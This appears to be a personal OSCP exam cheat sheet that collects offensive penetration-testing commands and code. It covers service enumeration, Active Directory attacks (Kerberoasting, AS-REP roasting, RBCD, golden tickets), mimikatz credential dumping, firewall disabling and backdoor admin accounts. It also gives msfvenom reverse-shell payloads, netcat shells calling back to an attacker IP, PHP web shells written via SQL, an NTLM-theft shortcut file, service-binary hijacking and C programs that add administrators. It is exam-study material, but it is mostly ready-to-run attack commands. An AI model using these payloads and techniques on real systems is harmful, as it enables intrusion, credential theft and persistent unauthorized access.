# OSCP
Kullaisec - Just for simplicity and fastness

[[Windows PG](https://kullaisec.github.io/OSCP/oscp-windows-pg.ctb.pdf)]

[[Linux PG](https://kullaisec.github.io/OSCP/oscp-linux-pg.ctb.pdf)]

[[AD PG](https://kullaisec.github.io/OSCP/oscp-AD-pg.ctb.pdf)]

## Commands 

### FTP [21]

```powershell
ftp <IP>
#login if you have relevant creds or based on nmpa scan find out whether this has anonymous login or not, then loginwith Anonymous:password

put <file> #uploading file
get <file> #downloading file
passive

#NSE
locate .nse | grep ftp
nmap -p21 --script=<name> <IP>

#bruteforce
hydra -L users.txt -P passwords.txt <IP> ftp

#'-L' for usernames list, '-l' for username and viceversa

#check for vulnerabilities associated with the version identified.
```

### SSH [22]

```powershell
#Login
ssh uname@IP #enter password in the prompt

#id_rsa or id_ecdsa file
chmod 600 id_rsa/id_ecdsa
ssh uname@IP -i id_rsa/id_ecdsa #if it still asks for password, crack them using John

#cracking id_rsa or id_ecdsa
ssh2john id_ecdsa(or)id_rsa > hash
john --wordlist=/home/sathvik/Wordlists/rockyou.txt hash

#bruteforce
hydra -l uname -P passwords.txt <IP> ssh

#'-L' for usernames list, '-l' for username and viceversa

# If You have found any Directory Transversal and you are able to upload any files then You can Upload the ssh public key and get the shell Easily

ssh-keygen
# this will generate id_rsa.pub and id_rsa private keys in our /root/.ssh folder
Just copy these files to our pwd and rename the public key as `authorized_keys` and private key as norman id_rsa

and Upload the authorized_keys at `/home/username/.ssh/` path folder After uploading chnage the permissions of private key in our kali

ssh -i id_rsa username@IP

You will get ssh access to the target system !!

#check for vulnerabilities associated with the version identified.
```

### SMB

```powershell
sudo nbtscan -r 192.168.50.0/24 #IP or range can be provided

#NSE scripts can be used
locate .nse | grep smb
nmap -p445 --script="name" $IP 

#In windows we can view like this
net view \\<computername/IP> /all

#crackmapexec
crackmapexec smb <IP/range>  
crackmapexec smb 192.168.1.100 -u username -p password
crackmapexec smb 192.168.1.100 -u username -p password --shares #lists available shares
crackmapexec smb 192.168.1.100 -u username -p password --users #lists users
crackmapexec smb 192.168.1.100 -u username -p password --all #all information
crackmapexec smb 192.168.1.100 -u username -p password -p 445 --shares #specific port
crackmapexec smb 192.168.1.100 -u username -p password -d mydomain --shares #specific domain

#Inplace of username and password, we can include usernames.txt and passwords.txt for password-spraying or bruteforcing.
crackmapexec smb 192.168.225.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success

# Smbclient
smbclient -L //IP #or try with 4 /'s
smbclient //server/share
smbclient //server/share -U <username>
smbclient //server/share -U domain/username

#SMBmap
smbmap -H <target_ip>
smbmap -H <target_ip> -u <username> -p <password>
smbmap -H <target_ip> -u <username> -p <password> -d <domain>
smbmap -H <target_ip> -u <username> -p <password> -r <share_name>

#Within SMB session
put <file> #to upload file
get <file> #to download file

mask ""
recurse ON
prompt OFF
mget *

enum4linux -a $IP
```
### LDAP

```powershell

# nmap -sV --script "ldap* and not brute" $IP

ldapsearch -x -H ldap://192.168.225.122 -D '' -w '' -b "DC=hutch,DC=offsec"

or 

ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.225.122" "(objectclass=*)"

ldapsearch -x -H ldap://<IP>:<port> # try on both ldap and ldaps, this is first command to run if you dont have any valid credentials.

ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
#CN name describes the info w're collecting
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"

#windapsearch.py
#for computers
python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --computers

#for groups
python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --groups

#for users
python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --da

#for privileged users
python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --privileged-users
```

### NFS

```powershell
nmap -sV --script=nfs-showmount <IP>
showmount -e <IP>
```
If You found anythign Intresting Mount is accessiable for everyone mount that file locally and enumerate !!

![image](https://github.com/kullaisec/OSCP/assets/99985908/fc15a70c-d34c-48ed-8299-fd9aebe819d8)

Create a `mnt` folder locally in our kali

```powershell
# mount -t nfs -o vers=2 $IP:/home /mnt 
```

### SNMP
```powershell
#Nmap UDP scan
sudo nmap <IP> -A -T4 -p- -sU -v -oN nmap-udpscan.txt

Must Try:

→ Seen SNMP running so started with the snmp enumeration !!

Before starting make sure you have these settings setup:


sudo apt-get install snmp-mibs-downloader
sudo download-mibs

# Finally comment the line saying "mibs :" in /etc/snmp/snmp.conf
sudo vi /etc/snmp/snmp.conf

snmpbulkwalk -c public -v2c $IP

snmpbulkwalk -c public -v2c $IP NET-SNMP-EXTEND-MIB::nsExtendOutputFull

snmpbulkwalk -c public -v2c $IP .

snmpcheck -t <IP> -c public #Better version than snmpwalk as it displays more user friendly

snmpwalk -c public -v1 -t 10 <IP> #Displays entire MIB tree, MIB Means Management Information Base
snmpwalk -c public -v1 <IP> 1.3.6.1.4.1.77.1.2.25 #Windows User enumeration
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.4.2.1.2 #Windows Processes enumeration
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.6.3.1.2 #Installed software enumeraion
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.6.13.1.3 #Opened TCP Ports

#Windows MIB values
1.3.6.1.2.1.25.1.6.0 - System Processes
1.3.6.1.2.1.25.4.2.1.2 - Running Programs
1.3.6.1.2.1.25.4.2.1.4 - Processes Path
1.3.6.1.2.1.25.2.3.1.4 - Storage Units
1.3.6.1.2.1.25.6.3.1.2 - Software Name
1.3.6.1.4.1.77.1.2.25 - User Accounts
1.3.6.1.2.1.6.13.1.3 - TCP Local Ports
```

### RPC Enum

```powershell
rpcclient -U=user $IP
rpcclient -U="" $IP #Anonymous login
##Commands within in RPCclient
srvinfo
enumdomusers #users
enumpriv #like "whoami /priv"
queryuser <user> #detailed user info
getuserdompwinfo <RID> #password policy, get user-RID from previous command
lookupnames <user> #SID of specified user
createdomuser <username> #Creating a user
deletedomuser <username>
enumdomains
enumdomgroups
querygroup <group-RID> #get rid from previous command
querydispinfo #description of all users
netshareenum #Share enumeration, this only comesup if the current user we're logged in has permissions
netshareenumall
lsaenumsid #SID of all users
```

### MSFVENOM
```powershell
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe

msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```


### AD
.NET :
```powershell
whoami
```
```powershell
hostname
```
Enum Local users:
```powershell
net users
```
```powershell
net user
PS> Get-LocalUser
```
Enum Domain users:
```powershell
net users /domain
```
Enum Domain Groups:
```powershell
net groups /domain 
```
Enum Local Groups:
```powershell
net localgroup
```
Enum Local Group member:
```powershell
net localgroup <group-name>
```
Enum Users of Domain group:
```powershell
net group "<Group-Name>" /domain
```

#### PowerView.ps1:
```powershell
Import-Module .\PowerView.ps1
```
Domain Controller details:
```powershell
Get-DomainController
```
Enum Total Computers on domain:
```powershell
Get-DomainComputer | select samaccountname , name
```

Enum users and their groups in Domain:
```powershell
Get-DomainUser | select name,memberof
```
Enum Groups and their members:
```powershell
Get-DomainGroup | select name, member
```
Enum Particular Group recursively !!
```powershell
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```
Enum loggedin Users in Local Computer:
```powershell
Get-NetLoggedon | select username
```
**Imp: Run this command in every machine !! And with every server name  **
```powershell
PS> Get-NetLoggedon -Computername DC01
```
```powershell
PS> Get-NetLoggedon -Computername <servername>
```
#### Enum active sessions on the host:
```powershell
PS> Get-NetSession
```
```powershell
PS> Get-NetSession -Computername <servername>
```
#### Command: 
```powershell
Invoke-UserHunter -CheckAccess
```
1. Get Domain Admins members 
2. Get list of Computers 
3. Get-netloggedon and get-netsession on each computers 
3. Get-netloggedon and get-netsession on each computers 
4. Search if there is a Active Domain Admins session in any Computers. 
5. See if your user id a local admin on the machine that have the DA session  

Finding IP of particular servers:
```powershell
nslookup dc01
```
```powershell
nslookup <server_name>
```
### Add User to Domain and a Group
```powershell
PS> net user kullai kali@116 /add /domain

PS> net group "Group name" /add kullai
```
#### Enumerate the SPN's and do kerberosting: [hashcat : -m 13100]
```powershell
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```
Import the **Invoke-Kerberost.ps1** from our kali.. 

```powershell
Import-Module .\Invoke-Kerberost.ps1
```

```powershell
PS> Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath 'c:\users\public\HashCapture.txt' -Width 8000
```

#### Kerberosting:
```powershell
# impacket-GetUserSPNs -request -dc-ip <DC-IP> oscp.lab/username
```
hashcat mode: 13100

Windows:
```powershell
PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
Linux:
```powershell
# sudo impacket-GetUserSPNs -request -dc-ip 192.168.237.70 corp.com/pete
```
```powershell
# python3 /home/kali/offsec/AD/tools/Tools/GetUserSPNs.py -dc-ip 192.168.238.70 -request -outputfile hashes.capstone2 corp.com/meg
```
→ Hashcat:
```powershell
# sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
#### As-Reproasting :
```powershell
# impacket-GetNPUsers oscp.lab/username -outfile wsername.hash
```
```powershell
ASRep with-out password !!

# GetNPUsers.py -dc-ip <IP> -no-pass -userfile usernames.txt domain/

#Asreproasting, need to provide usernames list

# GetNPUsers.py test.local/ -dc-ip <IP> -usersfile usernames.txt -format hashcat -outputfile hashes.txt

./GetNPUsers.py -dc-ip IP -request 'htb.local/'
```

We need to add $23$ to the hash like:

![image](https://github.com/kullaisec/OSCP/assets/99985908/94a9550e-6d4a-4a96-80fb-9e1e4570cfd7)

Linux:
```powershell
# impacket-GetNPUsers -dc-ip 192.168.225.70  -request -outputfile hashes.asreproast corp.com/pete
```
for this mostly we use the hashcat mode as 18200

Windows:
```powershell
PS C:\Tools> .\Rubeus.exe asreproast
```
```powershell
PS C:\Tools> .\Rubeus.exe asreproast /nowrap
```
→ Hashcat
```powershell
# sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### GenericAll Permission on Domain Controller [ DC ]:

Like this : 

![image](https://github.com/kullaisec/OSCP/assets/99985908/109df214-c1d4-483a-a183-f0b8ca91866c)

```powershell
# impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.161.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'hacker$' -computer-pass 'l9z3JiITmvqcwdq'
```
```powershell
PS > get-adcomputer hacker
```
![image](https://github.com/kullaisec/OSCP/assets/99985908/1eef77ea-dbd6-4a20-89a8-0c1d01d3ed69)

https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py

With this account added, we now need a python script to help us manage the delegation rights. Let's grab a copy of rbcd.py and use it to set **msDS-AllowedToActOnBehalfOfOtherIdentity** on our new machine account.

```powershell
# python3 rbcd.py -dc-ip 192.168.161.175 -t RESOURCEDC -f 'hacker' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone
```
```powershell
PS> Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-allowedtoactonbehalfofotheridentity
```
![image](https://github.com/kullaisec/OSCP/assets/99985908/90d4f7b8-d613-43ae-8c3a-64adb43f3754)

We now need to get the administrator service ticket. We can do this by using impacket-getST with our privileged machine account.

```powershell
# impacket-getST -spn cifs/resourcedc.resourced.local resourced/hacker\$:'l9z3JiITmvqcwdq' -impersonate Administrator -dc-ip 192.168.161.175
```
![image](https://github.com/kullaisec/OSCP/assets/99985908/81fdd1c3-07a3-4712-ad12-533ef3534d73)

This saved the ticket on our Kali host as Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache. We need to export a new environment variable named KRB5CCNAME with the location of this file.

```powershell
# export KRB5CCNAME=./Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
```

```powershell
# impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.161.175
```

you will get adminsitrator access !!

## Write Owner Privilge:

  We have access to `nico` user and we have WriteOwner Privilege to `Herman` user use command
  
  ```powershell
  Powerview> Set-DomainObjectOwner -Identity 'target_object[nico]' -OwnerIdentity 'controlled_principal[Herman]'
 ```
 And we can also own and reset the `Herman` User password
 
 ```powershell
  Powerview> Add-DomainObjectAcl -TargetIdentity Herman -PrincipleIdentity nico -Rights ResetPassword
 ```

 Now re-run the bloodHound And Now you can see the `nico` user owns and he can change the password of `Herman`

 Now try to change the `Herman` user password !!
 
 ```powershell

  $pass = ConvertTo-SecureString 'Password@123' -AsPlainText -Force

  SetDomainUserPassword Herman -AccountPassword $pass -Verbose
```

 Now the `Herman` is a user and he have `GenericAll` permissions on `BackUp Admins Group` Let's Add Herman to Backup Admins Group!!
 
 ```powershell
 PS> Get-DomainGroup -MemberIdentity Herman | select samaccountname
```
We already have the password ($pass) so start with the other commands !!
```powershell
   PS> $cred = New-Object System.Management.Automation.PSCredential('HTB\Herman', $pass)
   PS> Add-DomainGroupMember -Identity 'Backup_Admins' -Members Herman -Credential $cred
   PS> Get-DomainGroup -MemberIdentity Herman | select samaccountname
```
   Now we `Herman` is part of `Backup_Admins`!!

https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

## Golden Ticket !!

We have kgbre hash !! [From Linux]

`-domain-sid` --> 
```powrshell
Get-ADDomain htb.local
```
```powershell
# python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain htb.local  <user_name [Anything or administrator]>

# export KRB5CCNAME=<TGS_ccache_file>
```
```powershell
# Execute remote commands with any of the following by using the TGT
python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```

### Forced Password Change Using rpcclient

```powershell
ForceChangePassword [Using RPC-client]
 suppose we are `support` user and we have Privileges to chnage the password of `admin` user

--> First authenticate via RPC using the support username and his credentials
# rpccleint -U support IP 
rpcclient $> setuserinfo2 admin 23 'Password@123'
```

### Read GMSA Password 

![image](https://github.com/kullaisec/OSCP/assets/99985908/fe4a40fb-61c4-43f2-bdd6-87d811c6c349)

```powershell
The Web Admins can see the GMSA password of svc_apache$ user !!

We know that enox user is a member of Web Admins

So we can get the svc_apache$ user hash !!

Exploit Binary Path : https://github.com/expl0itabl3/Toolies/blob/master/GMSAPasswordReader.exe

/home/kali/offsec/AD/tools/Tools/GMSAPasswordReader.exe

Reference: https://swisskyrepo.github.io/InternalAllTheThings/active-directory/pwd-read-gmsa/#gmsa-attributes-in-the-active-directory

PS> .\gmsapasswordreader.exe --accountname svc_apache
```
![image](https://github.com/kullaisec/OSCP/assets/99985908/4160a3e7-6964-4dbd-afd8-3f63b8ee6041)

You can see the hash `rc4hmac` you can pass the hash and get the interacted shell !!


### SMB to NTLM Theft

Create a offsec.url as below

```powershell
[InternetShortcut]
URL=anything
WordkingDirectory=anything
IconFile=\\KALI-IP\%USERNAME%.icon
IconIndex=1
```
Just Upload via SMB CLIENT and listen via Responder you will get the NTLM Hash !!



### LAPS:

![image](https://github.com/kullaisec/OSCP/assets/99985908/db596238-7457-4ce9-a9aa-34c49057aa47)

![image](https://github.com/kullaisec/OSCP/assets/99985908/81dec7e5-1334-4009-8ae6-412b2943ec6a)

```bash
# netexec ldap 192.168.225.122 -u username -p password --kdcHost HUTCHDC[see image] -M laps
```




#### Search anywhere file in windows:
```powershell
> dir /s/b \local.txt
```
```powershell
PS> Get-ChildItem -Path C:\ -Recurse -Filter *.log
```

#### Powershell History:
```powershell
PS C:\Users\adrian> type AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
#### If you have access as local admin in any windows system try to enable RDP

first create any user and add him to localadmin group
```powershell
> net user /add backdoor Password123
```
```powershell
> net localgroup administrators /add backdoor
```
#### Enable RDP Registry command !!
```powershell
> reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f
```
#### Disable Firewall:
```powershell
> netsh advfirewall set allprofiles state off
```
### Mimikatz:
```powershell
.\mimikatz.exe
```
```powershell
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # log
```
→ To dump the credentials of all logged-on users
```powershell
→ To dump the credentials of all logged-on users
mimikatz # sekurlsa::logonpasswords
mimikatz# lsadump::lsa /inject
mimikatz# lsadump::sam
mimikatz# lsadump::secrets
mimikatz# lsadump::cache
```

→ Show the tickets that are stored in memory
```powershell
mimikatz # sekurlsa::tickets
```

### Domain Synchronization:

→ lsadump::dcsync module and provide the domain username for which we want to obtain credentials as an argument for /user
```powershell
mimikatz # lsadump::dcsync /user:corp\dave
```
```powershell
mimikatz # lsadump::dcsync /user:corp\Administrator
```

### Crackmapexec:

for bruteforcing:
```powershell
# crackmapexec smb 192.168.225.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```

For checking if the pwned is reflected then that user is local admin on that system !!
```powershell
# crackmapexec smb 192.168.225.75 -u dave -p 'Flowers1' -d corp.com
```

## Files Transfers:

1) SMB: 
On Kali:
```powershell
impacket-smbserver test . -smb2support  -username kali -password kali
```
On Windows:
```powershell
net use m: \\Kali_IP\test /user:kali kali
```
```powershell
copy mimikatz.log m:\
```

File sharing via command line !!
```powershell
# kali : run smb !!! with username and password kali : kali

# Windows:

$pass = convertto-securestring 'kali' -AsPlaintext -Force
$pass
$cred = New-Object System.Management.Automation.PSCredential('kali', $pass)
$cred 
New-PSDrive -Name kali -PSProvider FileSystem -Credential $cred -Root \\IP\test
cd kali:
```

2) RDP mounting shared folder:
Using xfreerdp:
On Kali:
```powershell
xfreerdp /cert-ignore /compression /auto-reconnect /u:offsec /p:lab /v:192.168.212.250 /w:1600 /h:800 /drive:test,.
```
On windows:
```powershell
copy mimikatz.log \\tsclient\test\mimikatz.log
```
Using rdesktop:
On Kali:
```powershell
rdesktop -z -P -x m -u offsec -p lab 192.168.212.250 -r disk:test=/home/kali/Documents/pen-200
```

On Windows:
```powershell
copy mimikatz.log \\tsclient\test\mimikatz.log
```

3) Impacket tools:
psexec and wmiexec are shipped with built in feature for file transfer.
Note: By default whether you upload (lput) or download (lget) a file, it'll be writte in C:\Windows path.
Uploading mimikatz.exe to the target machine:
```powershell
C:\Windows\system32> lput mimikatz.exe
[*] Uploading mimikatz.exe to ADMIN$\/
C:\Windows\system32> cd C:\windows
C:\Windows> dir /b mimikatz.exe
mimikatz.exe
```
Downloading mimikatz.log:
```powershell
C:\Windows> lget mimikatz.log
[*] Downloading ADMIN$\mimikatz.log
```
4) Evil-winrm:
Uploading files:
```powershell
upload mimikatz.exe C:\windows\tasks\mimikatz.exe
```
Downloading files:
```powershell
download mimikatz.log /home/kali/Documents/pen-200
```
5) C2 frameworks:
Almost any of the C2 frameworks such as Metasploit are shipped with downloading and uploading functionality.

6) In FTP, binaries in ASCII mode will make the file not executable. Set the mode to binary.

Additional Resources:

File Transfer:  https://www.youtube.com/watch?v=kd0sZWI6Blc

PEN-100: https://portal.offsec.com/learning-paths/network-penetration-testing-essentials-pen-100/books-and-videos/modal/modules/file-transfers

## Windows Environment Set :
See this make Windows shell looks good !!

Path: 
```powershell
/home/kali/Tib-Priv/Win/tools/Invoke-ConPtyShell.ps1
```
https://github.com/antonioCoco/ConPtyShell

## Windows Phpmyadmin Reverse shell:

Github Link: https://gist.github.com/BababaBlue/71d85a7182993f6b4728c5d6a77e669f

```sql
SELECT 
"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
INTO OUTFILE 'C:/wamp/www/uploader.php';
```
## Windows php Reverse shell:

Github Link : https://github.com/Dhayalanb/windows-php-reverse-shell

or 

```sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:/wamp/www/shell.php';
```



## Windows PrivEsc:

Automation:
```powershell
PS> . .\PowerUp.ps1
```
```powershell
PS> Invoke-AllChecks
```

Enumeration Tool [May give Privesc results]

https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe 
```powershell
PS> .\Seatbelt.exe all
```
**WinPeas:**

https://github.com/peass-ng/PEASS-ng/ >> Download only latest to get more accurate results!

Run a registry command to enable the colors if you are using GUI windows!
```powershell
> reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```
close the cmd and reopen 
```powershell
> .\winPeas.exe
```
Service Commands:
```powershell
> sc.exe qc <name>
```
```powershell
> sc.exe query
```
```powershell
> sc.exe query <name>
```

Modify a configuration option of a service:
```powershell
> sc.exe config <name> <option>= <value>
```

Start/Stop a service:
```powershell
> net start/stop <name>
```

### SeImpersonate:

```powershell
PS> .\PrintSpoofer64.exe -i -c powershell.exe
```
```powershell
C:\> .\GodPotato.exe -cmd "C:\Users\Public\nc.exe KALI_IP PORT -e cmd"
```
```powershell
PS> .\SweetPotato.exe -a whoami
```
```powershell
PS> .\SweetPotato.exe -p shell.exe
```

### SeRestorePrivilege

Reference : https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#eop-impersonation-privileges
```powershell
Now we need to rename the C:\Windows\System32\Utilman.exe  binary to →  Utilman.old

Now again rename the C:\Windows\System32\cmd.exe to →  Utilman.exe
 
and Now open the RDP session and enter windows + U and you will get adminstrator shell !!

# rdesktop DC01.heist.offsec
```
### SeManageVolumePrivilege [Reffer `Access` AD Box in PG cherrytree]

Resource : https://github.com/xct/SeManageVolumeAbuse

If some times it is patched then you can take a look on : https://github.com/CsEnox/SeManageVolumeExploit

share the file SeManageVolumeExploit.exe to the target machine and execute it !!

This exploit grants full permission on C:\ drive for all users on the machine.

-   Enables the privilege in the token
-   Creates handle to \.\C: with SYNCHRONIZE | FILE_TRAVERSE
-   Sends the FSCTL_SD_GLOBAL_CHANGE to replace S-1-5-32-544 with S-1-5-32-545

Upload to the target Systen and execute it !!
```powershell
PS> .\SeManageVolumeExploit.exe
```

![image](https://github.com/kullaisec/OSCP/assets/99985908/5353660e-bd36-4d2c-a2af-76c2a3b0dd06)

Now navigate to `C:\Windows\System32\wbem` now we have to replace the `.dll` file !!

```powershell
# msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.193 LPORT=6666 -f dll -o tzres.dll
```
After successfully replacing Just type `systeminfo` and listen on port 6666 you will get elevated shell !!

#### Medthod 2

Another Method PrivEsc:

https://github.com/CsEnox/SeManageVolumeExploit → read this !!
```powershell
PS C:\xampp\htdocs\uploads> .\SeManageVolumeExploit.exe
```
![image](https://github.com/kullaisec/OSCP/assets/99985908/22cd4f93-8387-4313-85f0-53129ef97bee)

```bash
# msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.176 LPORT=6666 -f dll -o Printconfig.dll
```

We need to replace the file : `C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll`

```powershell
PS C:\xampp\htdocs\uploads> Copy-Item -Path "C:\xampp\htdocs\uploads\Printconfig.dll" -Destination "C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll" -Force
```

and Listen on `6666`
```bash
# rlwrap -cAr nc -lvnp 6666
```
Enter the following commands :

```powershell
PS C:\xampp\htdocs\uploads> $type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")

PS C:\xampp\htdocs\uploads> $object = [Activator]::CreateInstance($type)
```
![image](https://github.com/kullaisec/OSCP/assets/99985908/a22879da-2099-4290-8359-a96a38fc4f12)

you can see we got the adminsitrator access !!


### Installed Applications x64 and x86
```powershell
x86
PS> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

x64
PS> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

## Windows Path Setting

Sometims when you enter `whoami` command then it is not recognized by the Windows!!

```powershell
C:\Users\Public> whoami

Error: 'whoami' is not recognized as an internal or external command operable program or batch file.

```

#### Solution:

```powershell
C:\Users\Public> set PATH=%PATH%;C:\windows\system32;C:\windows;C:\windows\System32\Wbem;C:\windows\System32\WindowsPowerShell\v1.0\;C:\windows\System32\OpenSSH\;C:\Program Files\dotnet\
```


### Insecure Service Permissions
```powershell
> .\winPEASany.exe quiet servicesinfo
```
Example:
Just ran the Winpeas !!

![image](https://github.com/kullaisec/OSCP/assets/99985908/437b6de4-78d8-4751-b087-057516123b38)

![image](https://github.com/kullaisec/OSCP/assets/99985908/e5ade749-a000-4c75-845b-6c40cb82c4c5)

![image](https://github.com/kullaisec/OSCP/assets/99985908/9614e16e-09cb-427a-b1f8-522112e73602)

Confirmed the attack vector 

Now We need to check manually whether we have permissions to overwrite that binary  !!!
```powershell
PS C:\Users\chris\temp> icacls "C:\program files\Kite"
```
```powershell
PS C:\Users\chris\temp> icacls C:\program files\Kite\KiteService.exe
```
![image](https://github.com/kullaisec/OSCP/assets/99985908/3ff026e3-8245-41c7-8df5-7bea6e98239b)

you can see we have Modify access !!

Now let's see the current status of the Service !!
```powershell
PS C:\Users\chris\temp> cmd.exe /c "sc qc KiteService"
```
![image](https://github.com/kullaisec/OSCP/assets/99985908/9c4d2ac8-a8e4-47ac-82a3-82d0787ea32c)

you can see it is Running currently and It will start as Local System [ i.e., Administrative privileges !! ]

So If we replace the KiteService.exe binary with our reverse shell binary with the same name an restart the service then 
we will get the Administrative Shell !!
```powershell
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.203 LPORT=8989 -f exe > shell8989.exe
```
Uploaded into the target machine and renamed as ** KiteService.exe** name

and using the powershell we forcefully replaced the original file and stopeed and started the service !!
```powershell
PS> Copy-Item -Path "C:\Users\chris\temp\KiteService.exe" -Destination "C:\program files\Kite\KiteService.exe" -Force
```
```powershell
PS> net stop KiteService
```
```powershell
PS> net start KiteService
```
### Windows Binary PrivEscs:[Binary Hijacking]

```powershell
#Identify service from winpeas
icalcs "path" #F means full permission, we need to check we have full access on folder
sc qc <servicename> #find binarypath variable
sc config <service> binpath= "\"C:\Users\Public\temp\rev.exe\"" #change the path to the reverseshell location
sc start <servicename>
```

#### Add Existing User to Local-Admin :

```c
#include <stdlib.h>

int main() {
    int i;
    i = system("net localgroup administrators <username> /add");
    return 0;
}
```
#### Cross Compilation:
```powershell
# x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

### Weak Registry Permissions

```powershell
#Look for the following in Winpeas services info output
HKLM\system\currentcontrolset\services\<service> (Interactive [FullControl]) #This means we have full access

accesschk /acceptula -uvwqk <path of registry> #Check for KEY_ALL_ACCESS

#Service Information from regedit, identify the variable which holds the executable
reg query <reg-path>

reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
#Imagepath is the variable here

net start <service>
```

#### Add New User as Local Admin and have RDP access
```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  i = system ("net localgroup 'Remote Management Users' dave2 /add");
  
  return 0;
}
```
#### Powershell Script that Add user to Local Admin [powershelladduser.ps1]

```powershell
# Add user 'andrea' to the local 'Administrators' group
try {
    Add-LocalGroupMember -Group "Administrators" -Member "andrea"
    Write-Output "User 'andrea' has been added to the Administrators group."
} catch {
    Write-Output "Failed to add user 'andrea' to the Administrators group."
}
```

### Unquoted Service Path

**Powershell**

